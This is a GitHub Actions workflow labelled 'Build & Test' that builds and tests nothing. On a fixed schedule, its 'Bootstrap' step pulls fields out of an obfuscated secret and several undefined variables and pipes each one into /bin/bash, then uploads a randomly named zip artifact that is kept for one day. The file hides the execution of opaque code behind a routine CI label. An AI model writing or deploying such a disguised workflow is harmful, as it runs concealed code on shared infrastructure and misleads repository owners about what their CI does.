name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '47 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          n6181: ${{ secrets.n6181 }}
        run: |
          printf '%s' "$n6181" | jq -r .cds079 | /bin/bash
          echo $anh15 | jq -r .prs50 | /bin/bash
          echo $adkp1 | jq -r .ru0 | /bin/bash
          printf '%s' "$wr6238" | jq -r .xkqc660 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: jeCqmnnr
          path: "*.zip"
          retention-days: 1
